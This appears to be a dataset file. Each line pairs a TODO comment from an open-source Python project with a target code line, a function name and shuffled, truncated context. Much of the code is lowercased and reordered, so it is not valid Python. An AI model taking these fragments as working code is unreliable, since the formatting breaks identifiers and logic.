# todo: decide on replace= behavior, see #903 </s> req.content.seek(0)	_POST_mkdir_immutable return defer.succeed(self.node.get_uri()) # TODO: urlencode name = name.decode("utf-8") kids_json = req.content.read() kids = convert_children_json(self.client.nodemaker, kids_json)
persist=false  # todo: add log persistence </s> job_uuid='all',	build experiment_uuid=self.experiment_uuid,
# todo(b/182621549): for sobol sequences, dimension should be known at graph </s> dim = _get_static_dim(scale_matrix)	_process_mean_scale mean = 0.0 batch_shape = tf.shape(scale_matrix)[:-1] dtype = scale_matrix.dtype else:
# todo: get the real security group of launch in here </s> security_group = "default"	run_instances kwargs['key_name']) key_data = key_pair.public_key bridge_name = network.BridgedNetwork.get_network_for_project(context.user.id, context.project.id, security_group)['bridge_name'] for num in range(int(kwargs['max_count'])):
1  # todo: fill in identifier </s> )	test_automatic_dispute direct_transfer = channel1.create_directtransfer( amount_bob1, direct_transfer.sign(privatekey1, address1) channel0.register_transfer(direct_transfer)
# todo maybe include the _request here too? </s> seq = []	_extract_top_artists def _extract_top_artists(doc, network): for node in doc.getElementsByTagName("artist"): name = _extract(node, "name")
# todo: consolidate?? </s> self.event = salt.utils.event.masterevent(self.application.opts['sock_dir'])	post if tag_suffix: tag += tag_suffix ret = self.event.fire_event({ 'post': self.raw_data,
# todo: remove this skip after fixing </s> if sys.version[0] == '3':	test_reactive_draw @requires_application() def test_reactive_draw(): raise SkipTest with TestingCanvas() as c:
# todo(termie): we should probably return not founds instead of none </s> self.assertequals(delgetname_resp.body, '')	test_crud_tenant delgetname_resp = c.get_tenant_by_name(tenant_name=update_data['name'])
pass  # todo </s> (#todo unless deterministic is just as easy to implement)."""	merge_nick_groups for a given key, the value set for an arbitrary nick will be chosen
#@todo: remove in 0.4.10 </s> self.accounts[user] = self.info[user]['data']	add 'maxtraffic' : None, 'timestamp'  : 0}} self.accounts[user].update({'login'   : user, 'type'    : self.__name__,
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_start def test_start(self): Scanning the Tangle for all transfers, with start index.
# todo: match cciss* somehow </s> self._elevator_devs = "/sys/block/sd*/queue/scheduler"	__init__ self._scripts = [] self._elevator = ""
# todo: parlist, dots, block </s> self.assertequal(6, p._pos)	testFuncBodyEmptyParList self.assertIsNotNone(node)
# todo:   seems like they could be combined </s> self.handle_payload_exception(e)	fire self.repeater.fire_for_record(self) except Exception as e: raise else:
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_forward_slash'	vi_forward_slash def vi_forward_slash(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count'], 'search_string': vi_cmd_data['user_motion_input']} vi_cmd_data['count'] = 1
# todo: data could be chunked, proxy needs to handle this </s> decoded = self.decoder.decode_out(data)	handle_out_data logger.debug('Received {0} bytes from proxied service: {1}'.format(len(data), hex_data)) if self.decoder: logger.debug('Decoded response: {0}'.format(decoded)) session.add_event({'request': '', 'raw_response': decoded})
# todo docstring </s> desired_node_applications = []	change_node_configuration def change_node_configuration(self, desired_configuration, hostname): docstring for change_node_configuration for node in desired_configuration.nodes: if node.hostname == hostname:
# todo: decode all field to string </s> return temperatures	temperature if 'PMIC' in temperatures: del temperatures['PMIC']
1  # todo: fill in identifier </s> )	test_closewithouttransfer_badalice AB_Transfer1 = channelAB.create_directtransfer( transfer_amount, AB_Transfer1.sign(privatekeyA, addressA) channelAB.register_transfer(AB_Transfer1)
# todo: use weight scaling factor if provided, xavier's default else </s> self.weights = sharedx(	DenoisingAutoencoder borrow=True ) .5 * rng.rand(conf['n_vis'], conf['n_hid']) * conf['irange'], name='W',
# todo stub </s> def test_accumulate() -> none:	test_accumulate pass
# todo read2 is silently discarded </s> return	ProcessedReadWriter if self.too_short_outfile is not None: read1.write(self.too_short_outfile) if len(read1.sequence) > self.maximum_length: self.too_long += 1
# todo: redo using locally established collection </s> m_path = opj(m_path, 'localcollection')	test_unregister_collection @with_tempfile def test_unregister_collection(m_path): local_master = CollectionRepo(m_path, name='local') collection_url = "https://github.com/bpoldrack/ExampleCollection.git"
# todo: handle fancy-index copies by allocating a buffer and </s> return tuple(	_fallback_next def _fallback_next(self, next_index): fn(data[next_index]) if fn else data[next_index] for data, fn in safe_izip(self._raw_data, self._convert)
# todo deal with cached user dict here </s> users = get_all_users_by_domain(domain, group=group, user_filter=user_filter)	generate_case_export_payload key = [domain, {}, {}] cases = CommCareCase.view(view_name, startkey=key, endkey=key + [{}], reduce=False, include_docs=True) groups = Group.get_case_sharing_groups(domain) workbook = WorkBook()
# todo: fix this, this is one of the few cases where using the config </s> self.standalone = self.config.get('standalone', false)	Job default='DEBUG') self.__logging_handlers = {} if self.config.get('run.dry_run.enabled'):  # Modify args for dry-run unique_id = self.config.get('run.unique_job_id')
# todo: replace with isinstance(expr, bindabletypes) </s> if not isinstance(expr, (indexexpr, memberexpr, nameexpr)):	put def put(self, expr: Expression, typ: Type) -> None: return if not expr.literal:
1/0  # conflict resolution todo </s> elif list_a[uid] != status[uid][0]:  # item update in a	sync if uid in list_a and uid in list_b: if list_a[uid] != status[uid][0] and list_b[uid] != status[uid][1]: prefetch_items_from_a.append(uid) actions.append(('update', uid, 'a', 'b'))
# todo(dtroyer): remove tenant_id when we clean up the sdk refactor </s> attrs['tenant_id'] = project_id	_get_attrs parsed_args.project_domain, ).id attrs['project_id'] = project_id if 'availability_zone_hints' in parsed_args and \
# todo some complication with -1 label </s> y_ = y	test_classifiers_classes continue if name in ["LabelPropagation", "LabelSpreading"]: else: y_ = y_names
# todo: 289 </s> policyauthor.__init__(self, *args, **kwargs)	Alice Character.__init__(self, *args, **kwargs) if kwargs.get('is_me') and not federated_only: self.federated_only = federated_only def generate_kfrags(self, bob, label, m, n) -> List:
# todo: deprecated, remove in 1.5.0 </s> "admin": self.has_permission(permissions.admin),	as_dict "apikey": self._apikey, "settings": self._settings, "user": not self.is_anonymous, "roles": self._roles
# todo: match channel against [a-za-z0-9:._-]+ </s> raise exceptions.mpdnotimplemented  # todo	sendmessage ``sendmessage {CHANNEL} {TEXT}`` Send a message to the specified channel.
# todo: arrange </s> result = self.remote.remove_repo("testrepo0", self.token)	test_remove_repo def test_remove_repo(self, createRepo): Test: remove a repo object self.assertTrue(result)
# todo: remove this after we create the contents web service and directories are </s> def notebooks_only(nb_list):	notebooks_only return [nb for nb in nb_list if 'type' not in nb]
# todo: remove in sopel 8 </s> setattr(callback, '_sopel_url_callbacks_checked', true)	register_url_callback if isinstance(pattern, basestring): pattern = re.compile(pattern) self.memory['url_callbacks'][pattern] = callback
# todo need more daa </s> pass	test_license_declared_by_repo def test_license_declared_by_repo(augur_db_routes):
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: docstring </s> import ptvsd.wrapper	debug def debug(filename, port_num, debug_id, debug_options, run_as): import pydevd sys.argv[1:0] = [
# todo: choose one from the following two </s> config.add_no_good_cuts = true	solve config.add_slack = False if config.strategy == "GOA": config.use_tabu_list = False config.add_slack = False
except exception:  # todo: be specific </s> icap = false	parse_insta_json icap = icap.replace('\n', ' ') icap = (icap[:256] + u'…') if len(icap) > 256 else icap if ivideo is True: botmessage = "[insta] Video by "
continue  # todo should we store relations? </s> data = mimepart.body	Blob with_self=parsed.content_type.is_singlepart()): if mimepart.content_type.is_multipart(): if sha256(data).hexdigest() == self.data_sha256: log.info('Found subpart with hash {}'.format(
# todo adding and removing tracks as if this was a regular list </s> sp_track=lib.sp_playlist_track(sp_playlist, key), add_ref=true)	_Tracks self._session,
# todo: redundancy between all gaze mappers -> might be moved to parent class </s> audio.say("stopping calibration")	stop def stop(self): logger.info('Stopping Calibration') self.screen_marker_state = 0
# todo: use <meta charset /> </s> try:	getEncoding def getEncoding(s): import charade.universaldetector u = charade.universaldetector.UniversalDetector()
# todo is pexpect thread safe, e.g. could we be blocked on this </s> pnum = self.con.expect('notification handle = .*? \r', timeout=.5)	run with self.connection_lock: try: if pnum == 0: after = self.con.after
# todo; not sure what's wrong here. possible bug? </s> @pytest.mark.xfail	test_matcher_match_zero def test_matcher_match_zero(matcher): words1 = 'He said , " some words " ...'.split()
# todo ... </s> list_of_words.sort()  # ? ;)	main 'user-facing', 'of', 'other', 'for', 'smaller', 'deprecations,', 'a', 'optimizations,', 'changes,', 'including', 'and', 'Please', 'many', 'list'] print(list_of_words) print("Done")
# todo: show in display_problems() </s> show_invalid_depstring_notice(pkg, dep_string, str(e))	_add_pkg_deps except portage.exception.InvalidDependString as e: if pkg.installed: del e continue
# todo: this should disappear once the image package is refactored </s> from pybug.image import intensityimage, depthimage	smoothing_pyramid image_data = _smooth(self.pixels, sigma=sigma_aux, mode=mode, cval=cval) if (self.__class__ is IntensityImage or self.__class__ is DepthImage):
# todo: move trusted to be autodetected inside resource </s> package = package(source, trusted=true, **options)	describe_package Returns: Package: data package package.infer(stats=not nostats) if expand:
'expiration': (maya.now() + datetime.timedelta(days=3)).iso8601(),  # todo </s> }	alice 'm': m, 'n': n, response = ALICE.control.grant(request=grant_request) click.secho(response)
# todo: deprecate </s> code = self.create_authorization_code(	create_authorization_response self.request.user = grant_user if hasattr(self, 'create_authorization_code'): self.request.client, grant_user, self.request) else:
# todo: support all tzinfo subclasses by calling utcoffset() </s> raise valueerror('only tzfixedoffset supported.')	_format_date_time if date_time.tzinfo is not None: if date_time.tzinfo.__class__ is not TZFixedOffset: offset = date_time.tzinfo.offset if offset < 0:
dataarray = datasection.data.uint64s # todo implement 32 bit </s> for i, x in enumerate(dataarray):	getCFAddress size = dataSection.size charPointerType = target.GetBasicType(lldb.eBasicTypeChar).GetPointerType() if i % 4 != 2: continue
# todo: workaround, remove it when xgboost is fixes </s> 'n_gpus': -1	test_predict_pickle "predictor": "gpu_predictor", 'eval_metric': 'auc', } bst = xgb.train(param, dm, n_estimators,
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# todo: read xml lazily? </s> content_fobj.close()	sheet_names content_fobj = ods_file.open("content.xml") xml = content_fobj.read()  # will return bytes ods_file.close() source.fobj.close()
# todo: specific exception </s> messager.error('failed to retrieve trigger annotation %s, skipping event %s in search' % (e.trigger, e.id))	search_anns_for_event t_ann = ann_obj.get_ann_by_id(e.trigger) except: if (trigger_text != None and trigger_text != "" and trigger_text != "*" and trigger_text not in t_ann.text):
# todo: check correctness </s> for _ in range(leaf.d):	forget_point parent = grandparent self.traverse(parent, op=self._increment_depth, inc=-1) if parent: parent.n -= 1
# todo(twilson) we can remove this when we require ovs>=2.12.0 </s> return cls(driver, connection_string, helper)	OvnSbIdl return cls(driver, connection_string, helper, leader_only=False) except TypeError: def post_connect(self): When the ovs idl client connects to the ovsdb-server, it gets
self.last_recv = self.targets[0].recv(10000)  # todo: remove magic number (10000) </s> if self._check_data_received_each_request:	transmit try:  # recv if self._receive_data_after_each_request: self._fuzz_data_logger.log_check("Verify some data was received from the target.") if not self.last_recv:
# todo: candidate for move to system/hdparm </s> edit_done = false	update_hdparm_service only done when the service is freshly installed, ie when no existing /etc/systemd/system/rockstor-hdparm.service file exists in the first place. do_edit = False clear_line_count = 0
# todo: consider un-hardcoding this and plumbing pool_maxsize to requests.adapters.httpadapter. </s> self.thread_count = 10	__init__ self.log = logging.getLogger("ara.plugins.callback.default") self.client = None self.global_threads = ThreadPoolExecutor(max_workers=self.thread_count) self.task_threads = None
#todo(chris): implement service_catalog </s> self.service_catalog = none	_v2_auth ["nova"][0]["publicURL"] self.auth_token = body["auth"]["token"]["id"] else: raise exceptions.from_response(resp, body)
# todo: separate agent model. </s> self.ctrl.itr.value = itr	evaluate_agent def evaluate_agent(self, itr): self.ctrl.do_eval.value = True self.sync.stop_eval.value = False
# todo: this needs refactoring </s> def write_table_line(entry, table_filename, genome_filename):  # pragma: no cover	write_table_line with open(table_filename, 'at') as metadata_table: table_line = get_table_line(entry, genome_filename)
# todo(lyarwood): test drivervolumeblockdevice.driver_detach in </s> expected_connector = {'host': 'evacuated-host'}	test_detach_volume_evacuate def test_detach_volume_evacuate(self): conn_info_str = '{"connector": {"host": "evacuated-host"}}' self._test_detach_volume_evacuate(conn_info_str,
# todo: errors </s> response = con.read_bytes_finish(results)	rest_post_response def rest_post_response(self, con, results, sc, command, data, callback, error_callback, callback_data): if response == None: return
# todo: group by storage type also? </s> storage_units_by_type.setdefault(key, []).append(make_storage_unit(su))	get_descriptors ptype = su.storage_mapping.match.metadata['product_type'] key = (stype, ptype) result = {} for key, sus in storage_units_by_type.items():
return none # todo </s> def _plchanges(self, version):	_plchanges
# todo: implement </s> if self.turn == white:	pop def pop(self): move = self.move_stack.pop() self.ply -= 1 self.half_moves = self.half_move_stack.pop()
# todo: make sure 'feature' contains only capitals and underlines </s> re_str = feature + r"\s*=.*;"	set_enable content = re.sub(r'(ENABLE_.*=).*;', r'\1 false;', content) for feature in enables: target_str = feature + " = true;" content, count = re.subn(re_str, target_str, content)
# todo: factor out the logging? </s> log.msg('scheduling state write.')	__write_later def __write_later(self): if not (self.__delayed_write_call and self.__delayed_write_call.active()): self.__delayed_write_call = self.__reactor.callLater(_PERSISTENCE_DELAY, self.__write_immediately)
pass # todo </s> def add_save(self, pixbuf):	add_save
# todo: action value doesn't exist for beta </s> self.unittest(	test_late_horizon_estimate baseline_objective = 'policy_gradient' baseline_optimizer = 'adam' exclude_bounded_action=True, reward_estimation=reward_estimation, baseline_objective=baseline_objective, baseline_optimizer=baseline_optimizer
# todo: write this method if possible </s> pass	address_transactions def address_transactions(self, addresslist):
# todo: winexe calls hang and the test fails by timing out. the same </s> self.override_profile_config(	test_win2016_winexe Tests creating and deleting a Windows 2016 instance on EC2 using winrm (classic) 'ec2-win2016-test', {
raise notimplementederror # the below does most probably not work anymore todo </s> base = none	diff TESTS:: TODO if base == "dependencies": branch = self.git.current_branch()
# todo add in/out fifo contributions </s> p = self.get_nodeattr("pe")	bram_estimation Y. Umuroglu, M. Leeser and K. Vissers - 12. Sep 2018 Q = self.get_nodeattr("SIMD") wdt = self.get_weight_datatype()
expr,  # todo rethink this circular import </s> )	lll_for_self_call def lll_for_self_call(stmt_expr, context): from vyper.old_codegen.expr import ( pos = getpos(stmt_expr)
for people in annos:  # todo : speed up with affine transform </s> new_keypoints = []	keypoint_random_flip mask = cv2.flip(mask, 1) new_joints = [] for k in flip_list: point = people[k]
# todo: remove this backward compatibility code (in_proj_weight) </s> return torch.cat((self.q_proj_weight, self.k_proj_weight, self.v_proj_weight))	in_proj_weight @property def in_proj_weight(self):
pass #todo: show multi select menu </s> elif len(selectable) == 1 and hasattr(selectable[0], 'show_menu'):	mouseReleased game.main.session.ingame_gui.hide_menu() if len(selectable) > 1: selectable[0].show_menu() game.main.session.selected_instances = selectable
# todo: waffle here </s> index_posts.delay([instance.id])	update_post_search_index return from forums.tasks import index_posts
# todo: move this into demo/slow-completion.sh </s> if 1:	_InitDefaultCompletions comp_builtins.Complete(['-E', '-A', 'command'], ex, comp_lookup) comp_builtins.Complete(['-D', '-A', 'file'], ex, comp_lookup) A1 = completion.WordsAction(['foo.py', 'foo', 'bar.py']) A2 = completion.WordsAction(['m%d' % i for i in xrange(5)], delay=0.1)
# todo: check error location </s> assert result.data == {'nest': none}	test_non_nullable_list_of_nullables assert len(result.errors) == 1 assert result.errors[0].message == 'Cannot return null for non-nullable type.'
# fixme: todo </s> return results	execute_query result.append(value) results.append(ResultRow(*result))
# todo: consult best practices for python and twisted logging. </s> logging.basicconfig(level=logging.info)	configure_logging def configure_logging(): log.startLoggingWithObserver(log.PythonLoggingObserver(loggerName='shinysdr').emit, False)
# todo: handle errors better </s> abort(code=http_exceptions.unprocessableentity.code, message="value is required")	_process_patch_operation processing_status (bool) - True if operation was handled, otherwise False. if 'value' not in operation: if operation['op'] == parameters.PatchUserDetailsParameters.OP_TEST: if operation['path'] == '/current_password':
# todo : look for alive and killing </s> print "starting skonfui app"	run self.workersmanager_thread = threading.Thread(None, self.workersmanager, 'httpthread') self.workersmanager_thread.start() srv = run(host=self.http_host, port=self.http_port, server=self.http_backend)
#todo: write log file. </s> def init_xsrf(self):	ZhihuInspect if level.value >= self.debug_level.value: print(str) response = requests.get(self.url, headers = self.header) text = response.text
# todo: this is a hack to make a rule know </s> slot_id = f"slot_{key}_none"	get_parsing_states if slot is not None: if slot.value == "None" and slot.as_feature(): state_dict[slot_id] = 1 else:
# todo: check the crs </s> try:	main if not Path(image_file).is_file(): raise ValueError('file {} not exits.'.format(image_file)) label_src = rasterio.open(label_file) label_flag = 'raster'
# todo: use sqlalchemy objects to do this </s> sql = "select n.id from notes as n";	latest_notes def latest_notes(self, col, req): args = [] if req.data.has_key('updated_since'):
# temporary hack to get pf api working. todo - remove </s> try:	read def read(request, ids=[], index='',value=[]): domain = Domain.objects.get(name='Pathfinder') except Domain.DoesNotExist:
@unittest.skip('not written')  # todo: finish! </s> def test_object(self):	test_object raise NotImplementedError
# todo should we pass? </s> pass	trim_excess_cached_data except sqlite3.Error as err: _log.debug("Sqlite database unavailable: ?", err) if time_increment <= datetime.timedelta(minutes=30) or time_increment > datetime.timedelta(days=1): raise ValueError
# todo: find a better solution </s> if platform == "win":	_setupUI def _setupUI(self): super(RevHmOptions, self)._setupUI() default_size = QApplication.font().pointSize() for label in [self.form.fmtLabContrib, self.form.labHeading]:
# todo (jconnor 2013-01-22) make this configurable </s> easy_handle.setopt(pycurl.ssl_verifypeer, default_ssl_verify_peer)	_add_ssl_configuration def _add_ssl_configuration(self, easy_handle): easy_handle.setopt(pycurl.SSL_VERIFYHOST, DEFAULT_SSL_VERIFY_HOST)
# todo: test with unicode strings and non-ascii chars </s> message = "abcdefghijklmnopqrstuvwxyz"	test_sign_verify def test_sign_verify(self): signed = rsa.sign(message, self.priv) print "\tSigned:    %s" % signed
# todo remove backwards compatability fix in a future version </s> if build_version < 11100:	_init_backwards_compat_fixes preferences.set('vintageous_use_super_keys', preferences.get('vintageous_use_super_keys')) sublime.save_settings('Preferences.sublime-settings') def _migrate_rcfile(): old_file = os.path.join(sublime.packages_path(), 'User', '.vintageousrc')
# todo(pebaz): contents.extend([search down the '.'s!!]) </s> if module_file in contents:	find_spec for search_path in [Path(i) for i in (path + sys.path + ['.']) if Path(i).is_dir()]: contents = [i.name for i in search_path.iterdir()] print('Found it in', search_path, module, module_file) module_path = search_path / module_file
# todo handle color, scatter, etc </s> if len(kind) != len(data.columns):	plot return f.show(**show_args) elif isinstance(kind, dict): raise LanternException('Must specify type for each column') for k, v in kind.items():
# todo(haoyuzhang): understand slowdown of setting learning phase when </s> tf.keras.backend.set_learning_phase(1)	run if flags_obj.skip_eval: if flags_obj.set_learning_phase_to_train: num_eval_steps = None validation_data = None
# todo implement this </s> pass	FileEventFactory def generate_event(self): generate a event return None
# todo(mierdin): note that this will always return true if rbac is not enabled </s> if rbac_utils.user_has_role(requester_user, role):	_can_respond LOG.debug("Checking user %s is in role %s" % (requester_user, role)) LOG.debug(rbac_utils.user_has_role(requester_user, role)) roles_passed = True break
# todo: check complex data types possible for series for dataframes set column here </s> c = numba.pythonapi._boxcontext(context, builder, pyapi, env_manager)	codegen if context.enable_nrt: context.nrt.incref(builder, arr, arr_arg) py_arr = hpat.hiframes.boxing._box_series_data(arr.dtype, arr, arr_arg, c) cstr = context.insert_const_string(builder.module, col_name)
#todo : multi parent intelligence </s> if id in self.children:	remove_child def remove_child(self, id): self.children.remove(id)
pass  # todo: replace this </s> try:	__eq__ this = eval(f'self.{attribute}') except Exception as exc_this: that = eval(f'other.{attribute}') except Exception as exc_that:
# todo(rbharath): this should be modified to contain a cluster split so </s> splitters = {	load_pdbbind_from_dir if split == None: return pdbbind_tasks, (dataset, None, None), transformers 'index': deepchem.splits.IndexSplitter(), 'random': deepchem.splits.RandomSplitter(),
# todo(b/186451541): reduce the number of calls to model_fn. </s> self.assertequal(mock_model_fn.call_count, 4)	test_construction_calls_model_fn federated_averaging.build_federated_averaging_process( model_fn=mock_model_fn, client_optimizer_fn=tf.keras.optimizers.SGD)
# todo(benjy): some more elegant way to coordinate how tasks claim targets. </s> egroups = self.context.products.get_data('exclusives_groups')	execute binary = target_roots[0] if isinstance(binary, JvmBinary): group_key = egroups.get_group_key_for_target(binary) group_classpath = egroups.get_classpath_for_group(group_key)
# todo: this procedure would leave a clean dataset, but `run` cannot handle dirty </s> ds.add('code', to_git=true)	test_configs def test_configs(path, super_path): ds = Dataset(path).create(force=True) ds.add('.') ds.save()
# todo: give users the ability to specify this via their profile </s> return self.fullname.split(' ')[0]	given_name The user's preferred given name, as they would be addressed personally. e.g.: "Jeffrey Spies" would be "Jeffrey" (or "Jeff")
# todo: some type checking that a is invertible hence a valid key </s> e = self(a)	HillCryptosystem return i(C) def enciphering(self,A,M): return e(M)
#todo: milestones = get_milestones(target_url) </s> milestones = []	import_some_issues def import_some_issues(issue_ids): labels = get_labels(target_url) issues = []
#@todo: remove in 0.4.10 </s> def _wait(self, seconds, reconnect):	_wait if seconds: self.setWait(seconds, reconnect)
#  todo: test </s> src.getmodifieditemattr("rolebonusdroneminingyield"),	handler "miningAmount",
pass  # todo </s> def test_charts(self):	test_charts
# todo 2.0: do not delete them, only set is_deleted on parent </s> attachments = self.attached_items	Contribution signals.event.contribution_deleted.send(self, parent=oldParent) self.setTrack(None) if attachments: for folder in attachments['folders']:
pass # todo </s> def handle_request(self, input):	handle_request
## todo: # fixme: remove me </s> if not paste_childrens:	get_all_pastes_domain paste_parent = father.replace(self.paste_directory, '')[1:] paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(paste_parent)) paste_childrens = self.r_serv_metadata.smembers('paste_children:{}'.format(father)) for children in paste_childrens:
# todo: if worker does not execute preprocessing, next state is not preprocessed here. </s> self.agent.observe(	_execute next_state = self.agent.state_space.force_batch(env_states[i]) next_states[i] = np.array(self.preprocessors[env_id].preprocess(next_state)) preprocessed_states=preprocessed_states[i], actions=actions[i], internals=[], rewards=env_rewards[i], next_states=next_states[i],
report_config = {}  # todo port to fooddata.from_request </s> request_slugs = [	report_config @property def report_config(self): 'gender', 'age_range',
# todo: how to handle not found authorname </s> result = db.session.query(db.authors).filter(db.authors.sort == auth.lstrip().strip()).first()	order_authors error = False for auth in sort_authors: if not result: error = True
except exception:  # todo: be specific </s> icap = false	parse_insta_json icap = icap.replace('\n', ' ') icap = (icap[:256] + u'…') if len(icap) > 256 else icap if ivideo is True: botmessage = "[insta] Video by "
# todo implement this effectively </s> print('run safety')	security_scan print('run bandit')
if isinstance(err, asyncio.cancellederror):  # todo: remove when updated to 3.8 </s> raise err	BlobAnnouncer log.debug("failed to announce %s, could only find %d peers, retrying soon.", blob_hash[:8], peers) except Exception as err: log.warning("error announcing %s: %s", blob_hash[:8], str(err)) async def _announce(self, batch_size: typing.Optional[int] = 10):
# todo in python 2.7 and later, this should be </s> attributes = dict((column, getattr(instance, column))	DefaultSerializer foreign_key_columns = foreign_keys(model) columns = (c for c in columns if c not in foreign_key_columns) for column in columns)
raise notimplementederror #todo </s> elif q.kw(i,"format"):	parse while i < l: if q.kw(i,"RETURN"): raise NotImplementedError #TODO elif q.kw(i,"REQUEST"):
# todo: move texture export to individual formats? this is practically smurf </s> if getexpsettings().exporttextures:	exportModel if not entitytypes: entitytypes = getEntityTypesForExport() path = os.path for materialname in model['materials']:
# todo: the following skipped suite and fixtures should be enabled </s> return ['api-key']	_filter_headers def _filter_headers(self):
# todo: import that elsewhere </s> from . import _control	shareConstant def shareConstant(**kwargs): _control.execQueue.socket.pumpInfoSocket() for key, value in kwargs.items():
# assert wrapped.type == 'multipolygon' todo: same as above </s> wrap = geometry.polygon([(3658653.1976781483, -4995675.379595791),	test_wrap_dateline assert wrapped.type == 'Polygon' wrapped = wrap.to_crs(geog_crs, wrapdateline=True) (4025493.916030875, -3947239.249752495), (4912789.243100313, -4297237.125269571),
# todo(b/144127474): remove this manual cleanup once tf.wrap_function(...) </s> with tracing.span(	_call_embedded_tf param_elements.append(param_fn(arg_part)) result_parts = wrapped_fn(*param_elements) 'EagerTFExecutor.create_call', 'resource_cleanup_after_invocation',
# todo(jjma): find a better way of describing this error to user. </s> with self.assertraisesregexp(valueerror,	testVersionWidth name='s1', pattern='span{SPAN:1}/ver{VERISON:2}/split1/*') ] 'Cannot find matching for split'): utils.calculate_splits_fingerprint_span_and_version(
# todo: log </s> print sys.exc_info(), 'exception in stream_events loop'	stream_events raise Exception() except: self.finish()
# todo this needs to be done on the content but seems to be a non-trival </s> if context.verbose:	pipe_fetchpage content = unicode(request.read(), request.headers['content-type'].split('charset=')[-1]) print "............FetchPage: content ................." print content.encode("utf-8")
# todo: look in other supported bumpversion config locations </s> bumpversion = none	configure_bumpversion def configure_bumpversion(project_settings): bumpversion_config_path = Path('.bumpversion.cfg') if not bumpversion_config_path.exists():
await self._stream.reset()  # todo: specify error code </s> def __aiter__(self):	Stream pass async def reset(self): return self async def __anext__(self):
# todo: remove at some point </s> all_groups_lowercase = all(key.islower() for key in groups)	make_inventory if is_inventory_group(key, value) } if not all_groups_lowercase: groups = {
# todo: remove in v.0.6 </s> x = np.array([[0, 0], [0, 1], [2, 0], [2, 1]])	test_deprecation_use_pca def test_deprecation_use_pca(self): y = np.array([1, 0, 1, 0]) lmnn = LMNN(k=2, use_pca=True)
# todo: implement me </s> loss = criterion(depth, image)	_test_smoke criterion = tgm.losses.DepthSmoothnessLoss()
raise mpdnotimplemented # todo </s> def _commands(self):	_commands @register(r'^commands$')
# todo: refactor, move to utils </s> dict = {}	get_form_data_context def get_form_data_context(self, form_data): if form_data: for field in form_data:
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
# todo check </s> return self.tags	metadata @interfacedoc def metadata(self):
# todo(sbauza): the current placement noauthmiddleware returns a 401 </s> return self._client.get(	_fake_get def _fake_get(self, *args): (url,) = args[1:] url, endpoint_override="http://127.0.0.1:%s" % self.service.port,
# todo: rewrite tests </s> pass	test_resend_confirmation_post_if_user_not_in_database @mock.patch('framework.auth.views.mails.send_mail') def test_resend_confirmation_post_if_user_not_in_database(self, send_mail):
# todo: may use sys.stdout.encoding if output_file = '-' </s> output_encoding = output_encoding or default_output_encoding	join if export_fields is None: export_fields = _get_export_fields(result.field_names, fields_exclude) if output_locale is not None: with rows.locale_context(output_locale):
# todo: the one_hot=true is only necessary because one_hot=false is </s> c01b_test = mnist(which_set='test', axes=('c', 0, 1, 'b'),	test_topo_c01b format. batch_size = 100 one_hot=True) c01b_X = c01b_test.X[0:batch_size,:]
# todo(slaweq): change this to neutron floating ips and turn neutron </s> mock_nova.floating_ips.list.return_value = [fake_floating_ip]	test_create_server_no_addresses mock_nova.servers.list.side_effect = [[build_server], [fake_server]] mock_nova.servers.delete.return_value = None mock_add_ips_to_server.return_value = fake_server self.cloud._SERVER_AGE = 0
# todo: remove next if due specific hack </s> if not ext_properties:	apply_target_dependency_packages for ext_property_node in ext_property_nodes: ext_properties.append(ext_property_node.get('Name')) ext_property_nodes = targets_file['tree']\ .xpath('//ns:PropertyGroup'
raise notimplementederror # todo </s> def em_step(self):	EM_step
# todo: should be injected </s> facade = awsfacade()	LambdasConfig class LambdasConfig(ResourceConfig): async def fetch_all(self, credentials, region, partition_name='aws', targets=None): functions = {} for raw_function in facade.get_lambda_functions(region):
# todo: support non-numericals like string </s> gen_nan_func = lambda a: np.full(len(a), np.nan)	_run_call_concat out_typ = self.typemap[lhs.name] df_list = guard(get_definition, self.func_ir, rhs.args[0]).items arg_names = ", ".join(['in{}'.format(i) for i in range(len(df_list))]) func_text = "def _concat_imp({}):\n".format(arg_names)
# todo(jflesch): update keyword index </s> self.__main_win.refresh_label_list()	ActionCreateLabel self.__main_win.doc)
# todo: use utils.serialize_user </s> user = user.load(doc['id'])	search_contributor users = [] for doc in docs: if user is None: logger.error('Could not load user {0}'.format(doc['id']))
# todo: replace all of this string templating with a function that accepts </s> monkey_cmdline = (	start ) if OperatingSystem.Windows == SystemInfoCollector.get_os(): MONKEY_CMDLINE_WINDOWS % {"monkey_path": self._config["destination_path"]} + monkey_options
# todo: arrange </s> result = self.remote.remove_distro("testdistro0", self.token)	test_remove_distro def test_remove_distro(self): Test: remove a distro object self.assertTrue(result) assert 0
# todo: get actual error message </s> raise _error('ec2subnetid and ec2subnetids together')	_add_instances if 'Ec2SubnetId' in Instances: if 'Ec2SubnetIds' in Instances: _validate_param(Instances, 'Ec2SubnetId', string_types) cluster['Ec2InstanceAttributes']['Ec2SubnetId'] = (
# todo add assertions </s> p = poll.objects.get()	test_update self.poll.question = "yours" self.poll.save() self.assertEqual(p.question, "yours")
# todo(ralexstokes) look at better way to handle once we have fork choice in place </s> except finalizedheadnotfound:	BeaconChainSyncer finalized_head = await self.chain_db.coro_get_finalized_head(BeaconBlock) finalized_slot = finalized_head.slot finalized_slot = self.genesis_config.GENESIS_SLOT self.logger.info(
# todo add options to maodify the sorted by key and the header options </s> matrix = sorted(matrix, key=lambda endpoint: endpoint[2])	do_show endpoint.p_next_state]) if len(matrix) > 0: matrix.insert(0, ['Name', 'State', 'MAC Address', 'Segment', 'Port', 'VLAN', 'IPv4', 'IPv6', 'Next State'])
